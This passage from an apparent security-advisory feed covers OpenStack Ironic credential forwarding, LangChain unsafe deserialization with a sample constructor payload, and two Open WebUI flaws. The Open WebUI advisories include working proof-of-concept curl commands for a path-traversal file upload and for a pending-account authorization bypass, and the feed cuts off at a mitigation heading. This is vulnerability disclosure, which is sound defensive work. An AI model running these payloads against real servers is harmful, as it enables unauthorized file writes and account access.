        <content type="html"><![CDATA[<p>An issue was discovered in idrac in OpenStack Ironic before 35.0.1. During import, a user invoking molds can request authorization to be sent to a remote endpoint. The credential forwarded is a time-limited Keystone token (which provides access to all OpenStack services Ironic is authorized for); or basic credentials configured for molds storage. The fixed versions are 26.1.6, 29.0.5, 32.0.1, and 35.0.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42997">https://nvd.nist.gov/vuln/detail/CVE-2026-42997</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2026/05/05/10">https://www.openwall.com/lists/oss-security/2026/05/05/10</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/05/05/10">http://www.openwall.com/lists/oss-security/2026/05/05/10</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-010.html">https://security.openstack.org/ossa/OSSA-2026-010.html</a></li>
<li><a href="https://github.com/advisories/GHSA-54w4-233h-x86g">https://github.com/advisories/GHSA-54w4-233h-x86g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-54w4-233h-x86g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T21:31:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ironic-python-agent] OpenStack Ironic has an Incorrect Resource Transfer Between Spheres]]></title>
        <id>https://github.com/advisories/GHSA-54w4-233h-x86g</id>
        <link href="https://github.com/advisories/GHSA-54w4-233h-x86g"/>
        <updated>2026-05-08T23:07:57.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in idrac in OpenStack Ironic before 35.0.1. During import, a user invoking molds can request authorization to be sent to a remote endpoint. The credential forwarded is a time-limited Keystone token (which provides access to all OpenStack services Ironic is authorized for); or basic credentials configured for molds storage. The fixed versions are 26.1.6, 29.0.5, 32.0.1, and 35.0.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42997">https://nvd.nist.gov/vuln/detail/CVE-2026-42997</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2026/05/05/10">https://www.openwall.com/lists/oss-security/2026/05/05/10</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/05/05/10">http://www.openwall.com/lists/oss-security/2026/05/05/10</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-010.html">https://security.openstack.org/ossa/OSSA-2026-010.html</a></li>
<li><a href="https://github.com/advisories/GHSA-54w4-233h-x86g">https://github.com/advisories/GHSA-54w4-233h-x86g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-54w4-233h-x86g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T21:31:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ironic-python-agent] OpenStack Ironic has an Incorrect Resource Transfer Between Spheres]]></title>
        <id>https://github.com/advisories/GHSA-54w4-233h-x86g</id>
        <link href="https://github.com/advisories/GHSA-54w4-233h-x86g"/>
        <updated>2026-05-08T23:07:57.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in idrac in OpenStack Ironic before 35.0.1. During import, a user invoking molds can request authorization to be sent to a remote endpoint. The credential forwarded is a time-limited Keystone token (which provides access to all OpenStack services Ironic is authorized for); or basic credentials configured for molds storage. The fixed versions are 26.1.6, 29.0.5, 32.0.1, and 35.0.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42997">https://nvd.nist.gov/vuln/detail/CVE-2026-42997</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2026/05/05/10">https://www.openwall.com/lists/oss-security/2026/05/05/10</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/05/05/10">http://www.openwall.com/lists/oss-security/2026/05/05/10</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-010.html">https://security.openstack.org/ossa/OSSA-2026-010.html</a></li>
<li><a href="https://github.com/advisories/GHSA-54w4-233h-x86g">https://github.com/advisories/GHSA-54w4-233h-x86g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-54w4-233h-x86g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T21:31:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ironic-python-agent] OpenStack Ironic has an Incorrect Resource Transfer Between Spheres]]></title>
        <id>https://github.com/advisories/GHSA-54w4-233h-x86g</id>
        <link href="https://github.com/advisories/GHSA-54w4-233h-x86g"/>
        <updated>2026-05-08T23:07:57.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in idrac in OpenStack Ironic before 35.0.1. During import, a user invoking molds can request authorization to be sent to a remote endpoint. The credential forwarded is a time-limited Keystone token (which provides access to all OpenStack services Ironic is authorized for); or basic credentials configured for molds storage. The fixed versions are 26.1.6, 29.0.5, 32.0.1, and 35.0.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42997">https://nvd.nist.gov/vuln/detail/CVE-2026-42997</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2026/05/05/10">https://www.openwall.com/lists/oss-security/2026/05/05/10</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/05/05/10">http://www.openwall.com/lists/oss-security/2026/05/05/10</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-010.html">https://security.openstack.org/ossa/OSSA-2026-010.html</a></li>
<li><a href="https://github.com/advisories/GHSA-54w4-233h-x86g">https://github.com/advisories/GHSA-54w4-233h-x86g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-54w4-233h-x86g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T21:31:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langchain-core] LangChain vulnerable to unsafe deserialization of attacker-controlled objects through overly broad `load()` allowlists]]></title>
        <id>https://github.com/advisories/GHSA-pjwx-r37v-7724</id>
        <link href="https://github.com/advisories/GHSA-pjwx-r37v-7724"/>
        <updated>2026-05-08T23:07:34.000Z</updated>
        <content type="html"><![CDATA[<p>LangChain contains older runtime code paths that deserialize run inputs, run outputs, or other application-controlled payloads using overly broad object allowlists. These paths may call <code>load()</code> with <code>allowed_objects="all"</code>. This does not enable arbitrary Python object deserialization, but it does allow any trusted LangChain-serializable object to be revived, which is broader than these runtime paths require. As a result, attacker-supplied LangChain serialized constructor dictionaries may cause trusted runtime paths to instantiate classes with untrusted constructor arguments.</p>
<p>Applications are exposed only when all of the following are true:</p>
<ol>
<li>The application accepts untrusted structured input, such as JSON, from a user or network request.</li>
<li>The application does not validate or canonicalize that input into an inert schema before invoking LangChain.</li>
<li>Attacker-controlled nested dictionaries or lists are preserved in LangChain run inputs or outputs.</li>
<li>The application uses an affected API path that later deserializes that run data.</li>
</ol>
<p>Known affected runtime surfaces include:</p>
<ul>
<li><code>RunnableWithMessageHistory</code></li>
<li><code>astream_log()</code></li>
<li><code>astream_events(version="v1")</code></li>
</ul>
<p>Related unsafe deserialization patterns may also affect applications that explicitly load serialized LangChain prompt or runnable objects from untrusted sources, including shared prompt stores, Hub artifacts with model configuration, or other application-controlled serialization stores.</p>
<p>Applications that validate incoming requests against a fixed schema, such as coercing user input to a plain string or message-content field before invoking LangChain, are unlikely to expose this deserialization primitive.</p>
<p>This release also fixes a related secret-marker validation bypass in the serialization and deserialization layer (<code>_is_lc_secret</code>). That issue creates an additional path by which attacker-controlled constructor dictionaries can avoid escaping during <code>dumps()</code> -&gt; <code>loads()</code> round-trips and reach LangChain object revival logic.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can submit untrusted structured input to an affected application, and have that structure preserved in LangChain run data, may be able to inject LangChain serialized constructor payloads such as:</p>
<pre><code class="language-json">{
  "lc": 1,
  "type": "constructor",
  "id": ["langchain_core", "messages", "ai", "AIMessage"],
  "kwargs": {"content": "attacker-controlled content"}
}
</code></pre>
<p>If this payload reaches a broad <code>load()</code> call, LangChain may instantiate the referenced class instead of treating the payload as inert user data.</p>
<p>Realistic impacts include:</p>
<ul>
<li>Persistent chat-history poisoning when revived <code>AIMessage</code>, <code>HumanMessage</code>, or <code>SystemMessage</code> objects are stored by <code>RunnableWithMessageHistory</code>.</li>
<li>Prompt injection or behavior manipulation if attacker-controlled messages are later included in model context.</li>
<li>Instantiation of unexpected trusted LangChain objects with attacker-controlled constructor arguments.</li>
<li>Possible credential disclosure or server-side requests if a reachable object reads environment credentials, creates clients, or contacts attacker-controlled endpoints during initialization.</li>
<li>Additional prompt-template or runnable-configuration impacts in applications that separately load and execute untrusted serialized LangChain objects.</li>
</ul>
<h2 id="remediation">Remediation</h2>
<p>LangChain will deprecate the affected APIs as part of this fix:</p>
<ul>
<li><code>RunnableWithMessageHistory</code></li>
<li><code>astream_log()</code></li>
<li><code>astream_events(version="v1")</code></li>
</ul>
<p>These are older code paths that are no longer recommended for new applications. They were not previously marked as deprecated, but recent LangChain documentation has primarily directed users toward newer streaming and memory patterns, including the <code>stream</code> API. Applications should migrate to the currently recommended APIs rather than continue depending on these older surfaces.</p>
<p>Separately, LangChain will update <code>load()</code> and <code>loads()</code> to tighten deserialization behavior so broad object revival is not applied implicitly to untrusted or application-controlled payloads. The older runtime surfaces listed above are being deprecated rather than preserved as supported paths for broad runtime deserialization.</p>
<p>This release also fixes a related secret-marker validation bypass in the serialization and deserialization layer (<code>_is_lc_secret</code>). That issue creates an additional path by which attacker-controlled constructor dictionaries can avoid escaping during <code>dumps()</code> -&gt; <code>loads()</code> round-trips and reach LangChain object revival logic.</p>
<h2 id="guidance-for-load-and-loads">Guidance for <code>load()</code> and <code>loads()</code></h2>
<p><code>load()</code> and <code>loads()</code> should be used only with trusted LangChain manifests or serialized objects from trusted storage. Do not pass user-controlled data to <code>load()</code> or <code>loads()</code>, and do not use them as general parsers for request bodies, tool inputs, chat messages, or other attacker-controlled data.</p>
<p><code>load()</code> and <code>loads()</code> are beta APIs, and their behavior may change as LangChain narrows unsafe defaults. Future LangChain versions will require callers to be explicit about which objects may be revived. Users should pass a narrow <code>allowed_objects</code> value appropriate for the specific trusted manifest they are loading, rather than relying on broad defaults or <code>allowed_objects="all"</code>, which permits the full trusted LangChain serialization allowlist.</p>
<h2 id="credits">Credits</h2>
<p>The original issue was first reported by @u-ktdi.</p>
<p>Similar findings were reported by @dewankpant, @shrutilohani, @Moaaz-0x, @pucagit.</p>
<p>A related <code>_is_lc_secret</code> marker bypass affecting <code>dumps()</code> -&gt; <code>loads()</code> round-trips was reported by @yardenporat353 (and a similar report by @localhost-detect)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langchain-ai/langchain/security/advisories/GHSA-pjwx-r37v-7724">https://github.com/langchain-ai/langchain/security/advisories/GHSA-pjwx-r37v-7724</a></li>
<li><a href="https://github.com/advisories/GHSA-pjwx-r37v-7724">https://github.com/advisories/GHSA-pjwx-r37v-7724</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pjwx-r37v-7724</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-08T23:07:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langchain-core] LangChain vulnerable to unsafe deserialization of attacker-controlled objects through overly broad `load()` allowlists]]></title>
        <id>https://github.com/advisories/GHSA-pjwx-r37v-7724</id>
        <link href="https://github.com/advisories/GHSA-pjwx-r37v-7724"/>
        <updated>2026-05-08T23:07:34.000Z</updated>
        <content type="html"><![CDATA[<p>LangChain contains older runtime code paths that deserialize run inputs, run outputs, or other application-controlled payloads using overly broad object allowlists. These paths may call <code>load()</code> with <code>allowed_objects="all"</code>. This does not enable arbitrary Python object deserialization, but it does allow any trusted LangChain-serializable object to be revived, which is broader than these runtime paths require. As a result, attacker-supplied LangChain serialized constructor dictionaries may cause trusted runtime paths to instantiate classes with untrusted constructor arguments.</p>
<p>Applications are exposed only when all of the following are true:</p>
<ol>
<li>The application accepts untrusted structured input, such as JSON, from a user or network request.</li>
<li>The application does not validate or canonicalize that input into an inert schema before invoking LangChain.</li>
<li>Attacker-controlled nested dictionaries or lists are preserved in LangChain run inputs or outputs.</li>
<li>The application uses an affected API path that later deserializes that run data.</li>
</ol>
<p>Known affected runtime surfaces include:</p>
<ul>
<li><code>RunnableWithMessageHistory</code></li>
<li><code>astream_log()</code></li>
<li><code>astream_events(version="v1")</code></li>
</ul>
<p>Related unsafe deserialization patterns may also affect applications that explicitly load serialized LangChain prompt or runnable objects from untrusted sources, including shared prompt stores, Hub artifacts with model configuration, or other application-controlled serialization stores.</p>
<p>Applications that validate incoming requests against a fixed schema, such as coercing user input to a plain string or message-content field before invoking LangChain, are unlikely to expose this deserialization primitive.</p>
<p>This release also fixes a related secret-marker validation bypass in the serialization and deserialization layer (<code>_is_lc_secret</code>). That issue creates an additional path by which attacker-controlled constructor dictionaries can avoid escaping during <code>dumps()</code> -&gt; <code>loads()</code> round-trips and reach LangChain object revival logic.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can submit untrusted structured input to an affected application, and have that structure preserved in LangChain run data, may be able to inject LangChain serialized constructor payloads such as:</p>
<pre><code class="language-json">{
  "lc": 1,
  "type": "constructor",
  "id": ["langchain_core", "messages", "ai", "AIMessage"],
  "kwargs": {"content": "attacker-controlled content"}
}
</code></pre>
<p>If this payload reaches a broad <code>load()</code> call, LangChain may instantiate the referenced class instead of treating the payload as inert user data.</p>
<p>Realistic impacts include:</p>
<ul>
<li>Persistent chat-history poisoning when revived <code>AIMessage</code>, <code>HumanMessage</code>, or <code>SystemMessage</code> objects are stored by <code>RunnableWithMessageHistory</code>.</li>
<li>Prompt injection or behavior manipulation if attacker-controlled messages are later included in model context.</li>
<li>Instantiation of unexpected trusted LangChain objects with attacker-controlled constructor arguments.</li>
<li>Possible credential disclosure or server-side requests if a reachable object reads environment credentials, creates clients, or contacts attacker-controlled endpoints during initialization.</li>
<li>Additional prompt-template or runnable-configuration impacts in applications that separately load and execute untrusted serialized LangChain objects.</li>
</ul>
<h2 id="remediation">Remediation</h2>
<p>LangChain will deprecate the affected APIs as part of this fix:</p>
<ul>
<li><code>RunnableWithMessageHistory</code></li>
<li><code>astream_log()</code></li>
<li><code>astream_events(version="v1")</code></li>
</ul>
<p>These are older code paths that are no longer recommended for new applications. They were not previously marked as deprecated, but recent LangChain documentation has primarily directed users toward newer streaming and memory patterns, including the <code>stream</code> API. Applications should migrate to the currently recommended APIs rather than continue depending on these older surfaces.</p>
<p>Separately, LangChain will update <code>load()</code> and <code>loads()</code> to tighten deserialization behavior so broad object revival is not applied implicitly to untrusted or application-controlled payloads. The older runtime surfaces listed above are being deprecated rather than preserved as supported paths for broad runtime deserialization.</p>
<p>This release also fixes a related secret-marker validation bypass in the serialization and deserialization layer (<code>_is_lc_secret</code>). That issue creates an additional path by which attacker-controlled constructor dictionaries can avoid escaping during <code>dumps()</code> -&gt; <code>loads()</code> round-trips and reach LangChain object revival logic.</p>
<h2 id="guidance-for-load-and-loads">Guidance for <code>load()</code> and <code>loads()</code></h2>
<p><code>load()</code> and <code>loads()</code> should be used only with trusted LangChain manifests or serialized objects from trusted storage. Do not pass user-controlled data to <code>load()</code> or <code>loads()</code>, and do not use them as general parsers for request bodies, tool inputs, chat messages, or other attacker-controlled data.</p>
<p><code>load()</code> and <code>loads()</code> are beta APIs, and their behavior may change as LangChain narrows unsafe defaults. Future LangChain versions will require callers to be explicit about which objects may be revived. Users should pass a narrow <code>allowed_objects</code> value appropriate for the specific trusted manifest they are loading, rather than relying on broad defaults or <code>allowed_objects="all"</code>, which permits the full trusted LangChain serialization allowlist.</p>
<h2 id="credits">Credits</h2>
<p>The original issue was first reported by @u-ktdi.</p>
<p>Similar findings were reported by @dewankpant, @shrutilohani, @Moaaz-0x, @pucagit.</p>
<p>A related <code>_is_lc_secret</code> marker bypass affecting <code>dumps()</code> -&gt; <code>loads()</code> round-trips was reported by @yardenporat353 (and a similar report by @localhost-detect)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langchain-ai/langchain/security/advisories/GHSA-pjwx-r37v-7724">https://github.com/langchain-ai/langchain/security/advisories/GHSA-pjwx-r37v-7724</a></li>
<li><a href="https://github.com/advisories/GHSA-pjwx-r37v-7724">https://github.com/advisories/GHSA-pjwx-r37v-7724</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pjwx-r37v-7724</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-08T23:07:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI Vulnerable to Arbitrary File Upload and Path Traversal]]></title>
        <id>https://github.com/advisories/GHSA-9pgh-j74g-qj6m</id>
        <link href="https://github.com/advisories/GHSA-9pgh-j74g-qj6m"/>
        <updated>2026-05-08T22:38:11.000Z</updated>
        <content type="html"><![CDATA[<h1 id="confidential"><strong>CONFIDENTIAL</strong></h1>
<h1 id="kl-can-2024-002">KL-CAN-2024-002</h1>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<table>
<thead>
<tr>
<th>#</th>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><strong>Discoverer</strong></td>
<td>Jaggar Henry &amp; Sean Segreti of KoreLogic, Inc.</td>
</tr>
<tr>
<td>2</td>
<td><strong>Date Submitted</strong></td>
<td>2024.03.12</td>
</tr>
<tr>
<td>3</td>
<td><strong>Title</strong></td>
<td>Open WebUI Arbitrary File Upload + Path Traversal</td>
</tr>
<tr>
<td>5</td>
<td><strong>Affected Vendor</strong></td>
<td>Open WebUI</td>
</tr>
<tr>
<td>6</td>
<td><strong>Affected Product(s)</strong></td>
<td>Open WebUI (Formerly Ollama WebUI)</td>
</tr>
<tr>
<td>7</td>
<td><strong>Affected Version(s)</strong></td>
<td>0.1.105</td>
</tr>
<tr>
<td>8</td>
<td><strong>Platform/OS</strong></td>
<td>Debian GNU/Linux 12 (bookworm)</td>
</tr>
<tr>
<td>9</td>
<td><strong>Vector</strong></td>
<td>HTTP web interface</td>
</tr>
<tr>
<td>10</td>
<td><strong>CWE</strong></td>
<td>CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'), CWE-434: Unrestricted Upload of File with Dangerous Type</td>
</tr>
</tbody></table>
<hr>
<h2 id="4-high-level-summary">4. High-level Summary</h2>
<p>Attacker controlled files can be uploaded to arbitrary locations on the web server's filesystem by abusing a path traversal vulnerability.</p>
<hr>
<h2 id="11-technical-analysis">11. Technical Analysis</h2>
<p>When attaching files to a prompt by clicking the plus sign (+) on the left of the message input box when using the Open WebUI HTTP interface, the file is uploaded to a static upload directory.</p>
<p>The name of the file is derived from the original HTTP upload request and is not validated or sanitized. This allows for users to upload files with names containing dot-segments in the file path and traverse out of the intended uploads directory. Effectively, users can upload files anywhere on the filesystem the user running the web server has permission.</p>
<p>This can be visualized by examining the python code for the <code>/rag/api/v1/doc</code> API route:</p>
<pre><code class="language-python">@app.post("/doc")
def store_doc(
    collection_name: Optional[str] = Form(None),
    file: UploadFile = File(...),
    user=Depends(get_current_user),
):
    # "https://www.gutenberg.org/files/1727/1727-h/1727-h.htm"

    print(file.content_type)
    try:
        filename = file.filename
        file_path = f"{UPLOAD_DIR}/{filename}"
        contents = file.file.read()
        with open(file_path, "wb") as f:
            f.write(contents)
            f.close()
</code></pre>
<p>The <code>file</code> variable is a representation of the multipart form data contained within the HTTP POST request. The <code>filename</code> variable is derived from the uploaded file name and is not validated before writing the file contents to disk.</p>
<p>This can be used to upload malicious models. These models are often distributed as pickled python objects and can be leveraged to execute arbitrary python bytecode once deserialized. Alternatively, an attacker can leverage existing services, such as SSH, to upload an attacker controlled <code>authorized_keys</code> file to remotely connect to the machine.</p>
<hr>
<h2 id="12-proof-of-concept">12. Proof-of-Concept</h2>
<p>Execute the following cURL command:</p>
<pre><code class="language-bash">TARGET_URI='https://redacted.com'; JWT='redacted'; LOCAL_FILE='/tmp/file_to_upload.txt'\
curl -H "Authorization: Bearer $JWT" -F "file=$LOCAL_FILE;filename=../../../../../../../../../../tmp/pwned.txt" "$TARGET_URI/rag/api/v1/doc"
</code></pre>
<p>Verify the file <code>pwned.txt</code> exists in the <code>/tmp/</code> directory on the machine hosting the web server:</p>
<pre><code class="language-console">ollama@webserver:~$ cat /tmp/pwned.txt 
korelogic
ollama@webserver:~$
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-9pgh-j74g-qj6m">https://github.com/open-webui/open-webui/security/advisories/GHSA-9pgh-j74g-qj6m</a></li>
<li><a href="https://github.com/advisories/GHSA-9pgh-j74g-qj6m">https://github.com/advisories/GHSA-9pgh-j74g-qj6m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9pgh-j74g-qj6m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-08T22:38:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI has Improper Authorization Control]]></title>
        <id>https://github.com/advisories/GHSA-4vg5-rp28-gvjf</id>
        <link href="https://github.com/advisories/GHSA-4vg5-rp28-gvjf"/>
        <updated>2026-05-08T22:34:13.000Z</updated>
        <content type="html"><![CDATA[<h1 id="confidential"><strong>CONFIDENTIAL</strong></h1>
<h1 id="vulnerability-disclosure-analysis-documentation">Vulnerability Disclosure Analysis Documentation</h1>
<hr>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<table>
<thead>
<tr>
<th>#</th>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><strong>Discoverer</strong></td>
<td>Taylor Pennington of KoreLogic, Inc.</td>
</tr>
<tr>
<td>2</td>
<td><strong>Date Submitted</strong></td>
<td>June 11, 2024</td>
</tr>
<tr>
<td>3</td>
<td><strong>Title</strong></td>
<td>Open WebUI Improper Authorization Control</td>
</tr>
<tr>
<td>5</td>
<td><strong>Affected Vendor</strong></td>
<td>Open WebUI</td>
</tr>
<tr>
<td>6</td>
<td><strong>Affected Product(s)</strong></td>
<td>Open WebUI (Formerly Ollama WebUI)</td>
</tr>
<tr>
<td>7</td>
<td><strong>Affected Version(s)</strong></td>
<td>0.1.105</td>
</tr>
<tr>
<td>8</td>
<td><strong>Platform/OS</strong></td>
<td>Debian GNU/Linux 12 (bookworm)</td>
</tr>
<tr>
<td>9</td>
<td><strong>Vector</strong></td>
<td>HTTP web interface</td>
</tr>
<tr>
<td>10</td>
<td><strong>CWE</strong></td>
<td>285 Improper Authorization</td>
</tr>
</tbody></table>
<hr>
<h2 id="4-high-level-summary">4. High-level Summary</h2>
<p>There is a missing authorization check affecting user accounts with a <code>pending</code> status allowing the user to make authenticated API calls as a <code>user</code> context.</p>
<hr>
<h2 id="11-technical-analysis">11. Technical Analysis</h2>
<p>The Open WebUI web application has three user role classifications: <code>user</code>, <code>admin</code>, and <code>pending</code>. By default, when Open WebUI is configured with <code>new sign-ups</code> enabled, the default user role is set to <code>pending</code>. In this configuration, an administrator is required to go into the Admin management panel following a new user registration and reconfigure the user to have a role of either <code>user</code> or <code>admin</code> before that user is able to access the web application. However, this check is only enforced at the client presentation layer, the API does not properly validate that the user has an authorized user role of <code>user</code>.</p>
<h3 id="request">Request</h3>
<pre><code class="language-http">POST /api/v1/auths/signup HTTP/1.1
Host: openwebui.example.com
Content-Length: 60

{ 
 "name": "", 
 "email": "bad_guy@korelogic.com", 
 "password": "a" 
 }
</code></pre>
<h3 id="response">Response</h3>
<pre><code class="language-http">HTTP/1.1 200 OK
...

{
"id": "f839557a-031a-47a5-9999-0b0998f8f959",
"email": "bad_guy@korelogic.com",
"name": "",
"role": "pending",
"profile_image_url": "/user.png",
"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImY4Mzk1NTdhLTAzMWEtNDdhNS05OTk5LTBiMDk5OGY4Zjk1OSJ9.Bk-S4ABXb1tRuiVNfOJYbQFB8ewixWA4a1FohvIZARs",
"token_type": "Bearer"
}
</code></pre>
<p>An attacker can then use the JWT in the above response to make direct API calls or they can forge the authentication response and use the web UI.</p>
<p>With the JWT, an attacker can now query the LLM. However, for this demonstration we will query the <code>/ollama/api/tags</code> endpoint and get a list of available models as this is an authenticated endpoint. Attempting to make this request without a valid JWT returns an HTTP <code>401 Unauthorized</code> response.</p>
<h3 id="request-1">Request</h3>
<pre><code class="language-http">GET /ollama/api/tags HTTP/1.1
Host: openwebui.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImY4Mzk1NTdhLTAzMWEtNDdhNS05OTk5LTBiMDk5OGY4Zjk1OSJ9.Bk-S4ABXb1tRuiVNfOJYbQFB8ewixWA4a1FohvIZARs
</code></pre>
<h3 id="response-1">Response</h3>
<pre><code class="language-http">HTTP/1.1 200 OK
...

{
"models": [
    {
    "name": "ollama.com/emsi/mixtral-8x22b:latest",
    "model": "ollama.com/emsi/mixtral-8x22b:latest",
    "modified_at": "2024-04-12T17:27:51.479356401-04:00",
    "size": 79509285991,
    "digest": "9b000033acd802656a652c7df4e25300a61d903cd3c8eb065a50aaace484c319",
    "details": {
        "parent_model": "",
        "format": "gguf",
        "family": "llama",
        "families": ["llama"],
        "parameter_size": "141B",
        "quantization_level": "Q4_0"
    },
    "urls": [0]
    },
    ...
]
}
</code></pre>
<p>The logic for this endpoint can be seen here:
<a href="https://github.com/open-webui/open-webui/blob/0399a69b73de9789c4221acedea70d528e1346c4/backend/apps/ollama/main.py#L163-L180">https://github.com/open-webui/open-webui/blob/0399a69b73de9789c4221acedea70d528e1346c4/backend/apps/ollama/main.py#L163-L180</a></p>
<p>As shown below, the login checks if <code>url_idx</code> is <code>None</code> and if so, call <code>get_all_mdoels</code> and assign the result to <code>models</code> after that the logic checks if <code>app.state.MODEL_FILTER_ENABLED</code> is true and if not, it returns the result. As <code>MODEL_FILTER_ENABLED</code> is not configured by default, the application will not attempt to further validate the user.</p>
<pre><code class="language-python">@app.get("/api/tags")
@app.get("/api/tags/{url_idx}")
async def get_ollama_tags(
    url_idx: Optional[int] = None, user=Depends(get_current_user)
):
    if url_idx == None:
        models = await get_all_models()
        
        if app.state.MODEL_FILTER_ENABLED:
            if user.role == "user":
                models["models"] = list(
                    filter(
                        lambda model: model["name"] in app.state.MODEL_FILTER_LIST,
                        models["models"],
                    )
                )
                return models
        return models
</code></pre>
<p>This is just an example of one API endpoint but all other regular user accessible endpoints were accessible to a pending user.</p>
<p>The vulnerability is caused by a missing authorization check that occurs with <code>user=Depends(get_current_user)</code>. The logic of that function is found here:
<a href="https://github.com/open-webui/open-webui/blob/0399a69b73de9789c4221acedea70d528e1346c4/backend/utils/utils.py#L77-L97">https://github.com/open-webui/open-webui/blob/0399a69b73de9789c4221acedea70d528e1346c4/backend/utils/utils.py#L77-L97</a></p>
<pre><code class="language-python">def get_current_user(
auth_token: HTTPAuthorizationCredentials = Depends(bearer_security),
):
    # auth by api key
    if auth_token.credentials.startswith("sk-"):
        return get_current_user_by_api_key(auth_token.credentials)
    # auth by jwt token
    data = decode_token(auth_token.credentials)
    if data != None and "id" in data:
        user = Users.get_user_by_id(data["id"])
        if user is None:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail=ERROR_MESSAGES.INVALID_TOKEN,
            )
        return user
    else:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail=ERROR_MESSAGES.UNAUTHORIZED,
        )
</code></pre>
<p>As shown above, this logic does not verify the role of the user, the function simples checks if the JWT is valid.</p>
<hr>
<h2 id="12-proof-of-concept">12. Proof-of-Concept</h2>
<p>First, verify that an unauthenticated user receives <code>{"detail":"401 Unauthorized"}</code>:</p>
<pre><code class="language-bash">curl -s -X $'GET' \
    -H $'Host: openwebui.example.com' \
    -H $'Content-Type: application/json' \
    $'https://openwebui.example.com/ollama/api/tags'
</code></pre>
<p>The above curl command will return: <code>{"detail":"401 Unauthorized"}</code> as no Authorization Bearer token is provided.</p>
<p>Now to access the authentication endpoint, two calls will be made. The first cURL creates an account and sets the <code>$JWT</code> environment variable which will be utilized in the subsequent cURL command.</p>
<pre><code class="language-bash">export JWT=$(curl -s -X POST \
    -H 'Host: openwebui.example.com' -H 'Content-Length: 60' \
    -H 'Content-Type: application/json' \
    --data '{"name":"","email":"bad_guy@korelogic.com","password":"a"}' \
    'https://openwebui.example.com/api/v1/auths/signup' | jq '.token'|tr -d '"')

curl -v $'GET' \
    -H $'Host: openwebui.example.com' \
    -H $'Content-Type: application/json' \
    -H $'Authorization: Bearer ${JWT}' -H $'Content-Length: 2' \
    --data-binary $'\x0d\x0a' \
    $'https://openwebui.example.com/ollama/api/tags'
</code></pre>
<p>Additionally the <code>"role":"pending"</code> value in the HTTP response can be forged from <code>POST /api/v1/auths/signin</code> and <code>GET /api/v1/auths/</code> to utilize the full website. This can be achieved with a man-in-the-middle proxy such as Burp or Zap and modifying <code>pending</code> to <code>user</code>.</p>
<hr>
<h2 id="13-mitigation-recommendation">13. Mitigation Recommendation</h2>
